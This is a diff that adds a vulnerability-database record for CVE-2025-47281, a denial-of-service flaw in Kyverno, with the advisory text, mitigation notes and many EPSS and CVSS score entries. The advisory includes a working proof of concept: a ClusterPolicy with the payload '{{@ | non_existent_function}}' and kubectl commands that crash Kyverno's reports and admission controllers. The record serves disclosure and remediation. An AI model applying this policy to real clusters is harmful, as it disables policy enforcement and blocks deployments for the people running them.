@@ -1,0 +1,380 @@
+vulnerability_id: VCID-pe9w-3c8m-sqh6
+aliases:
+  - CVE-2025-47281
+  - GHSA-r5p3-955p-5ggq
+summary: "Kyverno's Improper JMESPath Variable Evaluation Lead to Denial of Service\n### Summary\n\
+  A Denial of Service (DoS) vulnerability exists in Kyverno due to improper handling of JMESPath\
+  \ variable substitutions. Attackers with permissions to create or update Kyverno policies\
+  \ can craft expressions using the `{{@}}` variable combined with a pipe and an invalid JMESPath\
+  \ function (e.g., `{{@ | non_existent_function }}`).\n\nThis leads to a `nil` value being\
+  \ substituted into the policy structure. Subsequent processing by internal functions, specifically\
+  \ `getValueAsStringMap`, which expect string values, results in a panic due to a type assertion\
+  \ failure (`interface {} is nil, not string`). This crashes Kyverno worker threads in the\
+  \ admission controller (and can lead to full admission controller unavailability in Enforce\
+  \ mode) and causes continuous crashes of the reports controller pod, leading to service degradation\
+  \ or unavailability.\"\n\n### Details\nThe vulnerability lies in the `getValueAsStringMap`\
+  \ function within `pkg/engine/wildcards/wildcards.go` (specifically around line 138):\n\n\
+  ```go\nfunc getValueAsStringMap(key string, data interface{}) (string, map[string]string)\
+  \ {\n    // ...\n    valMap, ok := val.(map[string]interface{}) // val can be the map containing\
+  \ the nil value\n    // ...\n    for k, v := range valMap { // If valMap contains a key whose\
+  \ value is nil...\n        result[k] = v.(string) // PANIC: v.(string) on a nil interface{}\n\
+  \    }\n    return patternKey, result\n}\n```\n\nWhen a policy contains a variable like `{{@\
+  \ | foo}}` (where `foo` is not a defined JMESPath function), the JMESPath evaluation within\
+  \ Kyverno's variable substitution logic results in a `nil` value. This `nil` is then assigned\
+  \ to the corresponding field in the policy pattern (e.g., a label value).\n\nDuring policy\
+  \ processing, `ExpandInMetadata` calls `expandWildcardsInTag`, which in turn calls `getValueAsStringMap`.\
+  \ If the `data` argument to `getValueAsStringMap` (derived from the policy pattern) contains\
+  \ this `nil` value where a string is expected, the type assertion `v.(string)` panics when\
+  \ `v` is `nil`.\n\n### Proof of Concept (PoC)\n\nThis proof of concept consists of two phases.\
+  \ First a malicious policy is inserted with the default validation failure action, which is\
+  \ `Audit`. In this phase the reports controller will end up in a crash loop. The admission\
+  \ controller will print out a similar stack trace, but only a worker crashes. The admission\
+  \ controller process does not crash.\n\nIn the second phase the same policy is inserted with\
+  \ the `Enforce` validation failure action. In this scenario both admission controller and\
+  \ the reports controller end up in a crash loop. As the admission controller crashes on incoming\
+  \ admission requests, it effectively makes it impossible to deploy new resources.\n\nTested\
+  \ on Kyverno v1.14.1.\n\n1.  **Prerequisites**:\n    Kubernetes cluster with Kyverno installed.\
+  \ Attacker has permissions to create/update `ClusterPolicy` or `Policy` resources.\n\n2. \
+  \ **Create a Malicious Policy**:\n    Apply the following `ClusterPolicy`:\n\n    ```yaml\n\
+  \    apiVersion: kyverno.io/v1\n    kind: ClusterPolicy\n    metadata:\n        name: dos-via-jmespath-nil\n\
+  \    spec:\n        rules:\n        - name: trigger-nil-panic\n          match:\n        \
+  \    any:\n            - resources:\n                kinds:\n                - Pod\n     \
+  \     validate:\n              message: \"DoS attempt via JMESPath nil substitution\"\n  \
+  \            pattern:\n                metadata:\n                  labels:\n            \
+  \        # '{{@ | non_existent_function}}' will result in a nil value for this label.\n  \
+  \                  # This nil value causes a panic in getValueAsStringMap.\n             \
+  \       trigger_panic: \"{{@ | non_existent_function}}\"\n    ```\n\n3.  **Verify the policy\
+  \ status**:\n    Make sure the policy is ready.\n\n    ```bash\n    k get clusterpolicy dos-via-jmespath-nil\n\
+  \    NAME                   ADMISSION   BACKGROUND   READY   AGE   MESSAGE\n    dos-via-jmespath-nil\
+  \   true        true         True    24m   Ready\n    ```\n\n3.  **Trigger the Policy**:\n\
+  \    Create any Pod in any namespace (if not further restricted by `match` or `exclude`):\n\
+  \n    ```bash\n    kubectl run test-pod-dos --image=nginx\n    ```\n\n4.  **Observe Crashes**:\n\
+  \    *   Check Kyverno admission controller logs for worker panics (`interface conversion:\
+  \ interface {} is nil, not string`).\n    *   Check Kyverno reports controller logs; the pod\
+  \ crashes and restarts.\n    *   Stack trace available here (as a secret gist): https://gist.github.com/thevilledev/723392bad36020b82209262275434380\n\
+  \n5. **Reset**:\n   Delete the existing policy with `kubectl delete clusterpolicy dos-via-jmespath-nil`\
+  \ and delete\n   the test pod with `kubectl delete pod test-pod-dos`. Then apply the following:\n\
+  \n   ```yaml\n    apiVersion: kyverno.io/v1\n    kind: ClusterPolicy\n    metadata:\n    \
+  \    name: dos-via-jmespath-nil-enforce\n    spec:\n        validationFailureAction: Enforce\
+  \ # This has changed\n        rules:\n        - name: trigger-nil-panic\n          match:\n\
+  \            any:\n            - resources:\n                kinds:\n                - Pod\n\
+  \          validate:\n              message: \"DoS attempt via JMESPath nil substitution\"\
+  \n              pattern:\n                metadata:\n                  labels:\n         \
+  \           # '{{@ | non_existent_function}}' will result in a nil value for this label.\n\
+  \                    # This nil value causes a panic in getValueAsStringMap.\n           \
+  \         trigger_panic: \"{{@ | non_existent_function}}\"\n   ```\n\n6.  **Trigger the Policy\
+  \ (again)**:\n    Create any Pod in any namespace (if not further restricted by `match` or\
+  \ `exclude`):\n\n    ```bash\n    kubectl run test-pod-dos --image=nginx\n    ```\n\n    The\
+  \ command returns the following error:\n\n    ```bash\n    Error from server (InternalError):\
+  \ Internal error occurred: failed calling webhook \"validate.kyverno.svc-fail\": failed to\
+  \ call webhook: Post \"https://kyverno-svc.kyverno.svc:443/validate/fail?timeout=10s\": EOF\n\
+  \    ```\n\n7.  **Observe Crashes**:\n    *   Check Kyverno admission controller logs for\
+  \ container panic. Notice that the whole controller has crashed, not just a worker.\n    *\
+  \   Check Kyverno reports controller logs; the pod crashes and restarts.\n\n### Impact\n\n\
+  This is a Denial of Service (DoS) vulnerability.\n\n*   **Affected Components**:\n    *  \
+  \ **Kyverno Admission Controller**: In Audit mode, individual worker threads handling admission\
+  \ requests will panic and terminate. While the main pod uses a worker pool and can recover\
+  \ by spawning new workers, repeated exploitation can degrade performance or lead to worker\
+  \ pool exhaustion. In Enforce mode, the whole controller panics. This makes all related admission\
+  \ requests fail.\n    *   **Kyverno Reports Controller**: The entire controller pod will panic\
+  \ and crash, requiring a restart by Kubernetes. This halts background policy scanning and\
+  \ report generation.\n\n*   **Conditions**: An attacker needs permissions to create or update\
+  \ Kyverno `Policy` or `ClusterPolicy` resources. This is often a privileged operation but\
+  \ may be delegated in some environments.\n*   **Consequences**: Degraded policy enforcement,\
+  \ inability to create/update resources, and loss of policy reporting visibility. \n\n### Mitigation\n\
+  \n- Add robust `nil` handling in `getValueAsStringMap`.\n- Look into adding graceful error\
+  \ handling in JMESPath substitution. Prevent evaluation errors (like undefined functions)\
+  \ from resulting in `nil` values."
+severities:
+  - score: '0.00035'
+    scoring_system: epss
+    scoring_elements: '0.0997'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00035'
+    scoring_system: epss
+    scoring_elements: '0.09977'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.13321'
+    published_at: '2025-08-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.13463'
+    published_at: '2025-08-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.13396'
+    published_at: '2025-08-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.1344'
+    published_at: '2025-08-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.13467'
+    published_at: '2025-08-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00046'
+    scoring_system: epss
+    scoring_elements: '0.13367'
+    published_at: '2025-08-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.1637'
+    published_at: '2025-09-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16272'
+    published_at: '2025-08-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16345'
+    published_at: '2025-09-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16325'
+    published_at: '2025-09-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16372'
+    published_at: '2025-09-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16432'
+    published_at: '2025-09-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16454'
+    published_at: '2025-09-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16468'
+    published_at: '2025-09-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16499'
+    published_at: '2025-09-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16371'
+    published_at: '2025-09-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16473'
+    published_at: '2025-09-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.1647'
+    published_at: '2025-09-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16586'
+    published_at: '2025-09-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00053'
+    scoring_system: epss
+    scoring_elements: '0.16568'
+    published_at: '2025-09-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19356'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.1933'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19337'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19336'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19371'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.1932'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19388'
+    published_at: '2025-10-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19345'
+    published_at: '2025-10-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19423'
+    published_at: '2025-10-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19424'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19391'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19377'
+    published_at: '2025-10-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19344'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.1929'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19373'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19351'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19489'
+    published_at: '2025-09-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19557'
+    published_at: '2025-10-01 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19515'
+    published_at: '2025-10-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19532'
+    published_at: '2025-10-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19412'
+    published_at: '2025-10-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '0.00061'
+    scoring_system: epss
+    scoring_elements: '0.19372'
+    published_at: '2025-10-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/kyverno/kyverno
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/kyverno/kyverno
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/kyverno/kyverno/commit/cbd7d4ca24de1c55396fc3295e9fc3215832be7c
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/kyverno/kyverno/commit/cbd7d4ca24de1c55396fc3295e9fc3215832be7c
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-07-23T20:49:21Z/
+    published_at: None
+    url: https://github.com/kyverno/kyverno/commit/cbd7d4ca24de1c55396fc3295e9fc3215832be7c
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/kyverno/kyverno/security/advisories/GHSA-r5p3-955p-5ggq
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/kyverno/kyverno/security/advisories/GHSA-r5p3-955p-5ggq
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-07-23T20:49:21Z/
+    published_at: None
+    url: https://github.com/kyverno/kyverno/security/advisories/GHSA-r5p3-955p-5ggq
+  - score: '7.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-47281
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-47281
+weaknesses:
+  - CWE-20
+  - CWE-248
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-47281
+    reference_type:
+    reference_id:
+  - url: https://github.com/kyverno/kyverno
+    reference_type:
+    reference_id:
+  - url: https://github.com/kyverno/kyverno/commit/cbd7d4ca24de1c55396fc3295e9fc3215832be7c
+    reference_type:
+    reference_id:
+  - url: https://github.com/kyverno/kyverno/security/advisories/GHSA-r5p3-955p-5ggq
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-47281
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:kyverno:kyverno:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:kyverno:kyverno:*:*:*:*:*:*:*:*
